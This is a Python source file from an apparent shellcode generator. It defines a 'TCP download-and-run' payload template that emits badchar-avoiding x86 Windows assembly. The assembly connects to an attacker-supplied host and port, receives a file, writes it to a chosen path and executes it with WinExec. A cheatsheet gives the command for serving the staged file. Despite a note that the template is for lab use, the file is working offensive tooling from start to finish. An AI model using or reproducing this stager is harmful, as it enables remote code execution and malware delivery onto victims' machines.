"""TCP download-and-run payload template.

Protocol (attacker server speaks first):
  [4 bytes LE] file_size
  [file_size bytes] raw file data

Framing mode: minimal. The four-byte size header is requested with one recv()
call to reduce emitted size. TCP may return a short header, so this template is
intended only for controlled lab links and is not a reliable transfer mode.

Template sequence:
  WSAStartup -> WSASocketA -> connect -> recv(4) -> VirtualAlloc ->
  recv loop -> closesocket -> CreateFileA -> WriteFile -> CloseHandle ->
  WinExec(dst_path)

Required functions: LoadLibraryA, WSAStartup, WSASocketA, connect, recv,
                    closesocket, VirtualAlloc, CreateFileA, WriteFile,
                    CloseHandle, WinExec
Required variables: socket_handle, file_handle, virt_buf,
                    bytes_total, bytes_recvd
Required strings:   dst_path
"""
from __future__ import annotations

import socket
import struct

from .base import PayloadTemplate, TemplateConfig
from ..encode import (
    encode_dword, encode_word, safe_push_dword, safe_push_word_as_dword,
    safe_push_imm, safe_word_store, safe_dword_store,
    encode_byte,
    safe_lea, safe_mem_load, safe_mem_store,
    safe_push_mem, safe_call_mem,
    safe_add_from_mem, safe_sub_from_mem, safe_add_to_mem, safe_cmp_with_mem,
)


class TcpDownloadTemplate(PayloadTemplate):

    def emit(self, layout, config: TemplateConfig) -> str:
        ip_le   = struct.unpack("<I", socket.inet_aton(config.lhost))[0]
        port_be = socket.htons(config.lport)
        bc = config.badchars

        wsa_start_off  = -layout.slot("WSAStartup").offset
        wsa_sock_off   = -layout.slot("WSASocketA").offset
        conn_off       = -layout.slot("connect").offset
        recv_fn_off    = -layout.slot("recv").offset
        closesk_off    = -layout.slot("closesocket").offset
        valloc_off     = -layout.slot("VirtualAlloc").offset
        createfile_off = -layout.slot("CreateFileA").offset
        writefile_off  = -layout.slot("WriteFile").offset
        closehdl_off   = -layout.slot("CloseHandle").offset
        winexec_off    = -layout.slot("WinExec").offset

        sock_h_off      = -layout.slot("socket_handle").offset
        file_h_off      = -layout.slot("file_handle").offset
        virt_buf_off    = -layout.slot("virt_buf").offset
        bytes_total_off = -layout.slot("bytes_total").offset
        bytes_recvd_off = -layout.slot("bytes_recvd").offset

        wsadata_off  = -layout.slot("WSADATA").offset
        sockaddr_off = -layout.slot("sockaddr_in").offset

        try:
            dst_off = -layout.slot("dst_path").offset
        except KeyError as e:
            raise ValueError(
                "TcpDownloadTemplate requires a 'dst_path' string slot. "
                f"Missing: {e}"
            ) from e

        return "\n".join([
            "; -- TCP Download and Run Payload --",
            f"; Server: {config.lhost}:{config.lport}",
            f"; Writes to: {config.dst_path}",
            "; Protocol: [uint32 LE size][raw bytes]",
            "; Framing: minimal (single recv for size header; lab use only)",
            "",
            "    ; WSAStartup(0x0202, &WSADATA)",
            *safe_lea("esi", "ebp", wsadata_off, bc),
            "    push esi",
            *safe_push_word_as_dword(0x0202, bc),
            *safe_call_mem("ebp", wsa_start_off, bc),
            "",
            "    ; WSASocketA(AF_INET=2, SOCK_STREAM=1, IPPROTO_TCP=6, 0, 0, 0)",
            "    xor  eax, eax",
            "    push eax",
            "    push eax",
            "    push eax",
            "    mov  al, 0x6",
            "    push eax                    ; IPPROTO_TCP",
            "    sub  al, 0x5",
            "    push eax                    ; SOCK_STREAM",
            "    inc  eax",
            "    push eax                    ; AF_INET",
            *safe_call_mem("ebp", wsa_sock_off, bc),
            *safe_mem_store("ebp", sock_h_off, "eax", bc),
            "",
            "    ; sockaddr_in: sin_port and sin_addr (sin_family set by structure init)",
            *safe_lea("edi", "ebp", sockaddr_off, bc),
            "    xor  eax, eax",
            *encode_word(port_be, bc, "ax"),
            *safe_word_store("edi", 0x02, "ax", bc, tmp="ecx"),
            "    ; sin_port (big-endian)",
            *encode_dword(ip_le, bc, "eax"),
            *safe_dword_store("edi", 0x04, "eax", bc, tmp="ecx"),
            "    ; sin_addr (network order)",
            "",
            "    ; connect(socket, &sockaddr_in, 0x10)",
            *safe_lea("eax", "ebp", sockaddr_off, bc),
            *safe_push_imm(0x10, bc),
            "    push eax",
            *safe_push_mem("ebp", sock_h_off, bc),
            *safe_call_mem("ebp", conn_off, bc),
            "",
            "    ; recv(socket, &bytes_total, 4, 0) - read 4-byte file size",
            "    xor  eax, eax",
            *safe_lea("ecx", "ebp", bytes_total_off, bc),
            "    push eax                    ; flags = 0",
            *safe_push_imm(4, bc),
            "    ; len",
            "    push ecx                    ; buf = &bytes_total",
            *safe_push_mem("ebp", sock_h_off, bc),
            *safe_call_mem("ebp", recv_fn_off, bc),
            "",
            "    ; VirtualAlloc(NULL, bytes_total, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)",
            "    xor  eax, eax",
            *safe_push_imm(4, bc),
            "    ; PAGE_READWRITE",
            *_emit_mem_flags(0x3000, bc),
            "    ; MEM_COMMIT|MEM_RESERVE = 0x3000",
            *safe_push_mem("ebp", bytes_total_off, bc),
            "    xor  eax, eax",
            "    push eax                    ; lpAddress = NULL",
            *safe_call_mem("ebp", valloc_off, bc),
            *safe_mem_store("ebp", virt_buf_off, "eax", bc),
            "",
            "    ; initialise bytes_recvd = 0",
            "    xor  eax, eax",
            *safe_mem_store("ebp", bytes_recvd_off, "eax", bc),
            "",
            "tcp_recv_loop:",
            "    ; buf ptr = virt_buf + bytes_recvd",
            *safe_mem_load("eax", "ebp", virt_buf_off, bc),
            *safe_add_from_mem("eax", "ebp", bytes_recvd_off, bc),
            "    ; remaining = bytes_total - bytes_recvd",
            *safe_mem_load("ecx", "ebp", bytes_total_off, bc),
            *safe_sub_from_mem("ecx", "ebp", bytes_recvd_off, bc),
            "    xor  ebx, ebx",
            "    push ebx                    ; flags = 0",
            "    push ecx                    ; len = remaining",
            "    push eax                    ; buf",
            *safe_push_mem("ebp", sock_h_off, bc),
            *safe_call_mem("ebp", recv_fn_off, bc),
            "    test eax, eax",
            "    jle  tcp_recv_done          ; 0 = closed, negative = error",
            *safe_add_to_mem("ebp", bytes_recvd_off, "eax", bc),
            *safe_mem_load("eax", "ebp", bytes_recvd_off, bc),
            *safe_cmp_with_mem("eax", "ebp", bytes_total_off, bc),
            "    jl   tcp_recv_loop",
            "",
            "tcp_recv_done:",
            "    ; closesocket(socket)",
            *safe_push_mem("ebp", sock_h_off, bc),
            *safe_call_mem("ebp", closesk_off, bc),
            "",
            "    ; CreateFileA(dst_path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,",
            "    ;             FILE_ATTRIBUTE_NORMAL, NULL)",
            "    xor  ebx, ebx",
            "    push ebx                    ; hTemplateFile = NULL",
            *safe_push_dword(0x80, bc),
            "    ; FILE_ATTRIBUTE_NORMAL",
            *safe_push_imm(2, bc),
            "    ; CREATE_ALWAYS",
            "    push ebx                    ; lpSecurityAttributes = NULL",
            "    push ebx                    ; dwShareMode = 0",
            *_emit_generic_write(bc),
            "    ; GENERIC_WRITE = 0x40000000",
            *safe_lea("eax", "ebp", dst_off, bc),
            "    push eax                    ; lpFileName",
            *safe_call_mem("ebp", createfile_off, bc),
            *safe_mem_store("ebp", file_h_off, "eax", bc),
            "",
            "    ; WriteFile(file_handle, virt_buf, bytes_total,",
            "    ;           &bytes_recvd /* scratch */, NULL)",
            "    xor  eax, eax",
            "    push eax                    ; lpOverlapped = NULL",
            *safe_lea("eax", "ebp", bytes_recvd_off, bc),
            "    ; scratch for lpNumberOfBytesWritten",
            "    push eax",
            *safe_push_mem("ebp", bytes_total_off, bc),
            *safe_push_mem("ebp", virt_buf_off, bc),
            *safe_push_mem("ebp", file_h_off, bc),
            *safe_call_mem("ebp", writefile_off, bc),
            "",
            "    ; CloseHandle(file_handle)",
            *safe_push_mem("ebp", file_h_off, bc),
            *safe_call_mem("ebp", closehdl_off, bc),
            "",
            "    ; WinExec(dst_path, SW_SHOWNORMAL)",
            *safe_lea("eax", "ebp", dst_off, bc),
            *safe_push_imm(1, bc),
            "    push eax",
            *safe_call_mem("ebp", winexec_off, bc),
            "",
        ])

    def cheatsheet(self, config: TemplateConfig) -> list[tuple[str, str]]:
        return [
            ("Serve file for download",
             f"python3 Tools/tcp_stage_server.py --port {config.lport} --file <FILE_TO_SERVE>"),
            ("Protocol", "[4 bytes LE size][raw file bytes]"),
            ("File written to", config.dst_path),
        ]


def _emit_mem_flags(value: int, badchars: set[int]) -> list[str]:
    """Emit badchar-safe push of a memory flags constant like 0x3000."""
    return safe_push_dword(value, badchars)


def _emit_generic_write(badchars: set[int]) -> list[str]:
    """Emit badchar-safe push of GENERIC_WRITE (0x40000000)."""
    if 0x40 not in badchars:
        return [
            "    xor  eax, eax",
            "    mov  al, 0x40",
            "    shl  eax, 24               ; GENERIC_WRITE = 0x40000000",
            "    push eax",
        ]
    lines = encode_dword(0x40000000, badchars, "eax")
    lines.append("    push eax")
    return lines
